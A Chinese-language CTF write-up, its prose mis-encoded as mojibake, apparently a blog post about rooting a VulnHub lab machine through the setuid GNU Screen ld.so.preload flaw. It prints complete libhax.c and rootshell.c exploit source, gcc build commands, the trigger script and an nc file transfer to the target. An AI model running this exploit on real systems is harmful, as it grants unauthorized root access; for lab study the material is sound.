<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAUSS"><figure class="iseeu highlight /gauss"><table><tr><td class="code"><pre><span class="line">GNU <span class="keyword">Screen</span>æ˜¯ä¸€æ¬¾ç”±GNUè®¡åˆ’å¼€å‘çš„ç”¨äºå‘½ä»¤è¡Œç»ˆç«¯åˆ‡æ¢çš„è‡ªç”±è½¯ä»¶ã€‚</span><br><span class="line"></span><br><span class="line">ç”¨æˆ·å¯ä»¥é€šè¿‡è¯¥è½¯ä»¶åŒæ—¶è¿æ¥å¤šä¸ªæœ¬åœ°æˆ–è¿œç¨‹çš„å‘½ä»¤è¡Œä¼šè¯ï¼Œå¹¶åœ¨å…¶é—´è‡ªç”±åˆ‡æ¢ã€‚</span><br><span class="line"></span><br><span class="line">GNU <span class="keyword">Screen</span>å¯ä»¥çœ‹ä½œæ˜¯çª—å£ç®¡ç†å™¨çš„å‘½ä»¤è¡Œç•Œé¢ç‰ˆæœ¬ã€‚</span><br><span class="line"></span><br><span class="line">å®ƒæä¾›äº†ç»Ÿä¸€çš„ç®¡ç†å¤šä¸ªä¼šè¯çš„ç•Œé¢å’Œç›¸åº”çš„åŠŸèƒ½ã€‚</span><br></pre></td></tr></table></figure></div>

<p>çœ‹æ¥æ˜¯å±äºsuidå½“ä¸­çš„æ¼æ´è„šæœ¬ææƒï¼Œé‚£è„šæœ¬æ€ä¹ˆæ‰¾å‘¢</p>
<h4 id="1ï¼‰searchsploitæ‰¾ææƒè„šæœ¬æ–‡ä»¶"><a href="#1ï¼‰searchsploitæ‰¾ææƒè„šæœ¬æ–‡ä»¶" class="headerlink" title="1ï¼‰searchsploitæ‰¾ææƒè„šæœ¬æ–‡ä»¶"></a>1ï¼‰searchsploitæ‰¾ææƒè„šæœ¬æ–‡ä»¶</h4><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>searchsploit</code>æœç´¢è½¯ä»¶ç›¸å…³æ¼æ´æœ‰æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„è„šæœ¬ï¼Œè€Œä¸”å®ƒçš„ç‰ˆæœ¬å·ä¹Ÿå†™å‡ºæ¥äº†</p>
<p><img src="/2022/08/29/vulnhub/image-20221001224602898.png" alt="image-20221001224602898"></p>
<p>å‘ç°æœ‰ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ª<code>shè„šæœ¬</code>æ–‡ä»¶ï¼Œä¸€ä¸ª<code>txtæ–‡æœ¬</code>çš„ï¼ˆPOCï¼‰</p>
<p>çœ‹åˆ°æœ‰<code>shè„šæœ¬</code>æ–‡ä»¶è·¯å¾„ï¼Œå…ˆæŸ¥çœ‹å…¶å†…å®¹æ˜¯ä»€ä¹ˆï¼Œçœ‹çœ‹èƒ½ä¸èƒ½åˆ©ç”¨</p>
<p><img src="/2022/08/29/vulnhub/image-20221001224718080.png" alt="image-20221001224718080"></p>
<p>å‘ç°æ˜¯ä¸ª<code>cè¯­è¨€è„šæœ¬</code></p>
<p><img src="/2022/08/29/vulnhub/image-20221001224923228.png" alt="image-20221001224923228"></p>
<p>çœ‹æ¥æˆ‘ä»¬æ‰¾çš„æ˜¯æ­£ç¡®çš„ï¼Œæˆ‘ä»¬åˆ†æä¸€ä¸‹è¯¥è„šæœ¬æ–‡ä»¶ï¼Œçœ‹çœ‹æ€ä¹ˆåˆ©ç”¨å…¶æ¥ææƒ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">ä»”ç»†çœ‹å…¶å®è¿™é‡Œé¢æœ‰ä¸¤ä¸ªCè¯­è¨€è„šæœ¬</span><br><span class="line"></span><br><span class="line">ã€EOFä¸ºæ–‡ç»“æŸç¬¦å·ã€‘</span><br><span class="line"></span><br><span class="line">è€Œä¸”éœ€è¦ä¿å­˜åˆ°ä¸¤ä¸ªcæ–‡ä»¶ä¸­å»</span><br><span class="line">libhax.c</span><br><span class="line">rootshell.c</span><br><span class="line"></span><br><span class="line">ç„¶åç”¨gccå‘½ä»¤</span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line"></span><br><span class="line">å¯¹ä¸¤ä¸ªcæ–‡ä»¶è¿›è¡Œç¼–è¯‘ï¼Œä»è€Œç”Ÿæˆ</span><br><span class="line">libhax.so</span><br><span class="line">rootshell</span><br><span class="line"></span><br><span class="line">ç„¶ååœ¨æŠŠä¸¤ä¸ªcæ–‡ä»¶å’Œä¸¤ä¸ªç¼–è¯‘åç”Ÿæˆçš„æ–‡ä»¶ä¼ å…¥é¶æœºå</span><br><span class="line"></span><br><span class="line">åœ¨é¶æœºshellæŒ¨ä¸ªæ‰§è¡Œåé¢çš„å‘½ä»¤ï¼Œä»è€Œæ‹¿åˆ°rootæƒé™</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Triggering...&quot;</span></span><br><span class="line">screen -<span class="built_in">ls</span> <span class="comment"># screen itself is setuid, so...</span></span><br><span class="line">/tmp/rootshell                            </span><br></pre></td></tr></table></figure></div>

<p>ä¸ŠåŠéƒ¨åˆ†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="type">void</span> <span class="title function_">dropshell</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    chown(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">04755</span>);</span><br><span class="line">    unlink(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20221002124640256.png" alt="image-20221002124640256"></p>
<p>ä¸‹åŠéƒ¨åˆ†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20221002124701995.png" alt="image-20221002124701995"></p>
<p><strong>==&gt;</strong></p>
<p>æˆ‘ä»¬éœ€è¦åœ¨é¶æœºçš„/tmpç›®å½•ä¸‹ï¼Œä¼ å…¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STATA"><figure class="iseeu highlight /stata"><table><tr><td class="code"><pre><span class="line">libhax.<span class="keyword">so</span></span><br><span class="line">rootshell</span><br><span class="line">flag.<span class="keyword">sh</span>   <span class="comment">//å†…å®¹ä¸ºåé¢çš„å‘½ä»¤å†…å®¹</span></span><br></pre></td></tr></table></figure></div>

<p>è¿™ä¸‰ä¸ªæ–‡ä»¶</p>
<p>æˆ‘ä»¬å…ˆåœ¨è‡ªå·±çš„<code>kali</code>æœºä¸ŠæŠŠè¿™ä¸¤ä¸ªæ–‡ä»¶å‡†å¤‡å¥½</p>
<p>æˆ‘ä»¬ä¹Ÿå¯ä»¥å…ˆåˆ°æˆ‘ä»¬<code>kali</code>æœºçš„<code>/tmp</code>ç›®å½•ä¸‹</p>
<p>å…ˆæ‰§è¡Œ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CPP"><figure class="iseeu highlight /cpp"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt; EOF &gt; /tmp/libhax.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dropshell</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">chown</span>(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">chmod</span>(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">04755</span>);</span><br><span class="line">    <span class="built_in">unlink</span>(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">rm -f /tmp/libhax.c</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20221002124843966.png" alt="image-20221002124843966"></p>
<p>å†æ‰§è¡Œ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GRADLE"><figure class="iseeu highlight /gradle"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt; EOF &gt; <span class="regexp">/tmp/</span>rootshell.c</span><br><span class="line">#<span class="keyword">include</span> &lt;stdio.h&gt;</span><br><span class="line"><span class="keyword">int</span> main(<span class="keyword">void</span>)&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -o <span class="regexp">/tmp/</span>rootshell <span class="regexp">/tmp/</span>rootshell.c</span><br><span class="line">rm -f <span class="regexp">/tmp/</span>rootshell.c</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20221002124900295.png" alt="image-20221002124900295"></p>
<p>ã€è™½ç„¶ä¼šæŠ¥é”™ï¼Œä½†æ˜¯æ˜¯æ­£å¸¸çš„ï¼Œä¸å½±å“ç¼–è¯‘åäº§ç”Ÿçš„æ–‡ä»¶çš„æ‰§è¡Œã€‘</p>
<p>æ‰§è¡Œå</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STATA"><figure class="iseeu highlight /stata"><table><tr><td class="code"><pre><span class="line">libhax.<span class="keyword">so</span> </span><br><span class="line">rootshell </span><br><span class="line">è¿™ä¸¤ä¸ªæ–‡ä»¶å°±ç”Ÿæˆäº†</span><br></pre></td></tr></table></figure></div>



<p>ç„¶åæˆ‘ä»¬çš„<code>flag.sh</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash     #æ ‡æ˜æ‰§è¡Œç¯å¢ƒ</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Triggering...&quot;</span></span><br><span class="line">screen -<span class="built_in">ls</span> <span class="comment"># screen itself is setuid, so...</span></span><br><span class="line">/tmp/rootshell </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20221002134454968.png" alt="image-20221002134454968"></p>
<h4 id="2ï¼‰ncå‘é¶æœºä¼ å…¥è„šæœ¬ææƒæ–‡ä»¶"><a href="#2ï¼‰ncå‘é¶æœºä¼ å…¥è„šæœ¬ææƒæ–‡ä»¶" class="headerlink" title="2ï¼‰ncå‘é¶æœºä¼ å…¥è„šæœ¬ææƒæ–‡ä»¶"></a>2ï¼‰ncå‘é¶æœºä¼ å…¥è„šæœ¬ææƒæ–‡ä»¶</h4><p><code>å½“ç„¶å¦‚æœä½ ç”¨èšå‰‘è¿æ¥çš„shellçš„è¯ï¼Œç›´æ¥æŠŠæ–‡ä»¶æ‹–è¿›å»å°±è¡Œï¼Œç®€å•ä¸€ç‚¹</code></p>
<p>å¦‚æœç”¨ncçš„è¯å½“ç„¶ä¹Ÿä¸éš¾</p>
<p>å…ˆæ˜¯<code>kali</code>æœºæ§åˆ¶å°ã€ç›®å‰çŠ¶æ€ä¸º<code>/tmp</code>ä¸‹ã€‘</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">nc -lvp <span class="number">8888</span> &lt; libhax.so  <span class="regexp">//</span> &lt; è¡¨ç¤ºä¼ å…¥</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20221001233201455.png" alt="image-20221001233201455"></p>
<p>é¶æœº<code>shell</code>ã€å¿…é¡»åœ¨<code>/tmp</code>ç›®å½•ä¸‹æ‰èƒ½æ‰§è¡Œncã€‘</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">cd</span> /tmp</span><br><span class="line"><span class="attribute">nc</span> <span class="number">192.168.133.140</span> <span class="number">8888</span> &gt; libhax.so  //&gt;è¡¨ç¤ºä¼ å‡ºæ¥æ”¶æ–‡ä»¶,<span class="number">192.168.133.140</span>ä¸ºkaliæœºip</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20221001233223666.png" alt="image-20221001233223666"></p>
<p>çœ‹åˆ°ä¼ å…¥æˆåŠŸ</p>
<p><code>rootshell</code>å’Œ<code>flag.sh</code>æ–‡ä»¶ç±»ä¼¼ï¼Œä¸å†å±•ç¤º</p>
<p>æœ€åæˆåŠŸä¼ å…¥</p>
<p><img src="/2022/08/29/vulnhub/image-20221002132325197.png" alt="image-20221002132325197"></p>
<h4 id="3ï¼‰æ‰§è¡Œè„šæœ¬è¿›è¡Œææƒ"><a href="#3ï¼‰æ‰§è¡Œè„šæœ¬è¿›è¡Œææƒ" class="headerlink" title="3ï¼‰æ‰§è¡Œè„šæœ¬è¿›è¡Œææƒ"></a>3ï¼‰æ‰§è¡Œè„šæœ¬è¿›è¡Œææƒ</h4><hr>
<p>ä¼ å…¥å®Œæˆåï¼Œç»™<code>flag.sh</code>åŠ ä¸Šæ‰§è¡Œæƒé™</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x flag.sh</span><br></pre></td></tr></table></figure></div>

<p>ç„¶åæ‰§è¡Œå³å¯</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">./flag.sh</span><br></pre></td></tr></table></figure></div>

<hr>
<h5 id="å‡ºç°æ„å¤–"><a href="#å‡ºç°æ„å¤–" class="headerlink" title="*å‡ºç°æ„å¤–"></a>*<strong>å‡ºç°æ„å¤–</strong></h5><p><img src="/2022/08/29/vulnhub/image-20221002173352619.png" alt="image-20221002173352619"></p>
<p>ä¸çŸ¥é“æœ‰æ²¡æœ‰æœ‹å‹ä¹Ÿé‡åˆ°è¿™ç§æŠ¥é”™</p>
<p>æœ€åä¸€æ­¥æ‰§è¡Œ<code>rootshell</code>çš„æ—¶å€™ï¼Œå¼¹å‡ºè¿™ä¸ªå‘½ä»¤ï¼Œæˆ‘æœç´¢äº†ä¸€ä¸‹ï¼ŒçŒœæµ‹æ˜¯ä¸æ˜¯cè¯­è¨€è„šæœ¬å†™é”™äº†ï¼Œä½†æ˜¯ä»”ç»†æ£€æŸ¥å¹¶æ²¡æœ‰å‡ºé”™</p>
<p>ç„¶åæˆ‘ä»¬çœ‹äº†çœ‹æˆ‘ä»¬çš„<code>kali</code>å’Œ<code>é¶æœº</code>çš„gccç‰ˆæœ¬</p>
<p>å‘ç°</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DNS"><figure class="iseeu highlight /dns"><table><tr><td class="code"><pre><span class="line">kaliæœºæ˜¯ï¼š<span class="number">11.3.0-1</span></span><br><span class="line"></span><br><span class="line">é¶æœºæ˜¯ï¼š<span class="number">4</span>.<span class="number">9</span>.<span class="number">2</span></span><br></pre></td></tr></table></figure></div>

<p>ä½†æ˜¯ç¼–è¯‘å™¨ä¸åŒå¯¹ç»“æœåº”è¯¥æ²¡ä»€ä¹ˆå¤ªå¤§å½±å“</p>
<p>ä½†æˆ‘è¿˜æ˜¯è¯•è¯•èƒ½ä¸èƒ½åœ¨<code>é¶æœºçš„shell</code>é‡Œæ‰§è¡Œgccï¼Œè¿è¡Œä¸¤ä¸ªcè¯­è¨€è„šæœ¬æ–‡ä»¶ï¼Œå¾—åˆ°<code>rootshell</code>å’Œ<code>libhax.so</code>æ–‡ä»¶</p>
<p>ä½†æ˜¯åˆå‡ºç°</p>
<p><img src="/2022/08/29/vulnhub/image-20221002210307317.png" alt="image-20221002210307317"></p>
<p>åŸæ¥æ˜¯ç¼ºå°‘ç¯å¢ƒå˜é‡ï¼Œå¯¼è‡´æ— æ³•æ‰§è¡Œ</p>
<h6 id="ç»™gccé…ç½®ç¯å¢ƒå˜é‡"><a href="#ç»™gccé…ç½®ç¯å¢ƒå˜é‡" class="headerlink" title="ç»™gccé…ç½®ç¯å¢ƒå˜é‡"></a>ç»™<code>gcc</code>é…ç½®ç¯å¢ƒå˜é‡</h6><p><img src="/2022/08/29/vulnhub/image-20221002205950588.png" alt="image-20221002205950588"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">locate gcc</span><br><span class="line"></span><br><span class="line"><span class="title class_">PATH</span>=<span class="string">&quot;$PATH&quot;</span><span class="symbol">:/usr/lib/gcc/x86_64-linux-gnu/</span><span class="number">4.9</span>/cc1</span><br><span class="line"></span><br><span class="line">export <span class="title class_">PATH</span></span><br></pre></td></tr></table></figure></div>



<p>ç„¶åæˆ‘ä»¬ä»ç®€ï¼Œåœ¨é¶æœºæ‰§è¡Œ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CPP"><figure class="iseeu highlight /cpp"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt; EOF &gt; /tmp/libhax.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dropshell</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">chown</span>(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">chmod</span>(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">04755</span>);</span><br><span class="line">    <span class="built_in">unlink</span>(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">rm -f /tmp/libhax.c</span><br></pre></td></tr></table></figure></div>



<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GRADLE"><figure class="iseeu highlight /gradle"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt; EOF &gt; <span class="regexp">/tmp/</span>rootshell.c</span><br><span class="line">#<span class="keyword">include</span> &lt;stdio.h&gt;</span><br><span class="line"><span class="keyword">int</span> main(<span class="keyword">void</span>)&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -o <span class="regexp">/tmp/</span>rootshell <span class="regexp">/tmp/</span>rootshell.c</span><br><span class="line">rm -f <span class="regexp">/tmp/</span>rootshell.c</span><br></pre></td></tr></table></figure></div>

<p>æˆåŠŸæ‰§è¡Œ</p>
<p><img src="/2022/08/29/vulnhub/image-20221002210611503.png" alt="image-20221002210611503"></p>
<h6 id="å…³é”®æ¥äº†ã€æœŸå¾…ã€‘"><a href="#å…³é”®æ¥äº†ã€æœŸå¾…ã€‘" class="headerlink" title="å…³é”®æ¥äº†ã€æœŸå¾…ã€‘"></a>å…³é”®æ¥äº†ã€æœŸå¾…ã€‘</h6><p>æˆ‘ä»¬æ‰§è¡Œæˆ‘ä»¬çš„<code>flag.sh</code>è„šæœ¬</p>
<p><img src="/2022/08/29/vulnhub/image-20221002211351948.png" alt="image-20221002211351948"></p>
<hr>
<p>ç»è¿‡æ„å¤–å</p>
<p>ç»ˆäºæˆåŠŸææƒ</p>
<p><img src="/2022/08/29/vulnhub/image-20221002211423172.png" alt="image-20221002211423172"></p>
<p>åˆ°rootç›®å½•ä¸‹</p>
<p>æ‹¿åˆ°flag</p>
<p><img src="/2022/08/29/vulnhub/image-20221002211550887.png" alt="image-20221002211550887"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">888b   <span class="number"> 888 </span>d8b                                                     <span class="number"> 888 </span>    <span class="number"> 888 </span>888<span class="number"> 888 </span></span><br><span class="line">8888b  <span class="number"> 888 </span>Y8P                                                     <span class="number"> 888 </span>    <span class="number"> 888 </span>888<span class="number"> 888 </span></span><br><span class="line">88888b <span class="number"> 888 </span>                                                        <span class="number"> 888 </span>    <span class="number"> 888 </span>888<span class="number"> 888 </span></span><br><span class="line">888Y88b<span class="number"> 888 </span>888  .d8888b .d88b.      <span class="number"> 888 </span><span class="number"> 888 </span><span class="number"> 888 </span> .d88b.  888d888<span class="number"> 888 </span><span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888 Y88b888<span class="number"> 888 </span>d88P&quot;   d8P  Y8b     <span class="number"> 888 </span><span class="number"> 888 </span><span class="number"> 888 </span>d88&quot;&quot;88b 888P&quot;  <span class="number"> 888 </span>.88P<span class="number"> 888 </span>888<span class="number"> 888 </span></span><br><span class="line">888  Y88888<span class="number"> 888 </span>888    <span class="number"> 88888888 </span>    <span class="number"> 888 </span><span class="number"> 888 </span><span class="number"> 888 </span>888 <span class="number"> 888 </span>888     888888K  Y8P Y8P Y8P </span><br><span class="line">888   Y8888<span class="number"> 888 </span>Y88b.   Y8b.          Y88b<span class="number"> 888 </span>d88P Y88..88P<span class="number"> 888 </span>   <span class="number"> 888 </span>&quot;88b  &quot;   &quot;   &quot;  </span><br><span class="line">888    Y888<span class="number"> 888 </span> &quot;Y8888P &quot;Y8888        &quot;Y8888888P&quot;   &quot;Y88P&quot; <span class="number"> 888 </span>   <span class="number"> 888 </span><span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">                                                                                          </span><br><span class="line">                                                                                         </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Once again, a big thanks to all those who do these little challenges,</span><br><span class="line">and especially all those who give me feedback - again, it&#x27;s all greatly</span><br><span class="line">appreciated.  :-)</span><br><span class="line"></span><br><span class="line">I also want to send a big thanks to all those who find the vulnerabilities</span><br><span class="line">and create the exploits that make these challenges possible.</span><br><span class="line"></span><br><span class="line">ç¿»è¯‘ï¼š</span><br><span class="line"></span><br><span class="line">888b   <span class="number"> 888 </span>d8b                                                     <span class="number"> 888 </span>    <span class="number"> 888 </span>888<span class="number"> 888 </span></span><br><span class="line">8888b  <span class="number"> 888 </span>Y8P                                                     <span class="number"> 888 </span>    <span class="number"> 888 </span>888<span class="number"> 888 </span></span><br><span class="line">88888b <span class="number"> 888 </span>                                                        <span class="number"> 888 </span>    <span class="number"> 888 </span>888<span class="number"> 888 </span></span><br><span class="line">888Y88b<span class="number"> 888 </span>888  .d8888b .d88b.      <span class="number"> 888 </span><span class="number"> 888 </span><span class="number"> 888 </span> .d88b.  888d888<span class="number"> 888 </span><span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888 Y88b888<span class="number"> 888 </span>d88P&quot;   d8P  Y8b     <span class="number"> 888 </span><span class="number"> 888 </span><span class="number"> 888 </span>d88&quot;&quot;88b 888P&quot;  <span class="number"> 888 </span>.88P<span class="number"> 888 </span>888<span class="number"> 888 </span></span><br><span class="line">888  Y88888<span class="number"> 888 </span>888    <span class="number"> 88888888 </span>    <span class="number"> 888 </span><span class="number"> 888 </span><span class="number"> 888 </span>888 <span class="number"> 888 </span>888     888888K  Y8P Y8P Y8P </span><br><span class="line">888   Y8888<span class="number"> 888 </span>Y88b.   Y8b.          Y88b<span class="number"> 888 </span>d88P Y88..88P<span class="number"> 888 </span>   <span class="number"> 888 </span>&quot;88b  &quot;   &quot;   &quot;  </span><br><span class="line">888    Y888<span class="number"> 888 </span> &quot;Y8888P &quot;Y8888        &quot;Y8888888P&quot;   &quot;Y88P&quot; <span class="number"> 888 </span>   <span class="number"> 888 </span><span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">                                                                                        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">å†æ¬¡éå¸¸æ„Ÿè°¢æ‰€æœ‰å®Œæˆè¿™äº›å°æŒ‘æˆ˜çš„äººï¼Œ</span><br><span class="line">å°¤å…¶æ˜¯æ‰€æœ‰ç»™æˆ‘åé¦ˆçš„äººâ€”â€”å†ä¸€æ¬¡ï¼Œè¿™ä¸€åˆ‡éƒ½å¾ˆæ£’</span><br><span class="line">èµèµã€‚ :-)</span><br><span class="line"></span><br><span class="line">æˆ‘è¿˜è¦éå¸¸æ„Ÿè°¢æ‰€æœ‰å‘ç°æ¼æ´çš„äºº</span><br><span class="line">å¹¶åˆ›é€ ä½¿è¿™äº›æŒ‘æˆ˜æˆä¸ºå¯èƒ½çš„æ¼æ´ã€‚</span><br></pre></td></tr></table></figure></div>

<p><code>åè¡€äº†ï¼Œæœç„¶æ˜¯ä¸­çº§ï¼Œé¡ºä¾¿æé†’ä¸€ä¸‹å¤§å®¶ï¼Œéå¿…è¦ä¸è¦æ›´æ–°</code></p>
<p><strong>ä¸€ä¸ªæ——å­æ‰¾å®Œï¼Œæ¸¸æˆç»“æŸã€åè¡€äº†ã€‘</strong></p>
]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨å­¦ä¹ </category>
      </categories>
  </entry>
  <entry>
